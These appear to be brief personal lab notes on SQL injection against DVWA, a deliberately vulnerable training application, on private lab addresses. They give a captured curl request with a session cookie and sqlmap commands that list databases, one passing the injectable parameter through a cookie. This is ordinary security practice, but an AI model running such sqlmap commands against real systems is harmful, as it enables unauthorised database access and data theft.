# SQL Injection

## DVWA securitz high

```bash
curl 'http://192.168.0.15/dvwa/vulnerabilities/sqli/session-input.php#' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,_/_;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://192.168.0.15/dvwa/vulnerabilities/sqli/session-input.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Connection: keep-alive' -H 'Cookie: security=high; PHPSESSID=797pl8e9p24kj4ajl47a62ljq1' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'id=4&Submit=Submit'
```

```bash
sqlmap -u "http://192.168.0.15/dvwa/vulnerabilities/sqli/session-input.php" --cookie="security=high; PHPSESSID=eabpnq3hog8mmbu4bekhlkrr7c" --data="id=14&Submit=Submit" --second-url="http://192.168.0.15/dvwa/vulnerabilities/sqli/#" --dbs
```

## No. 2

### ID saved in cookie

```bash
sqlmap -u 'http://192.168.56.1/dvwa/vulnerabilities/sqli_blind/' --cookie='id=3; PHPSESSID=2amdd69r17kpa7ja1b8uor0v0p; security=high' --level 2 --dbs
```
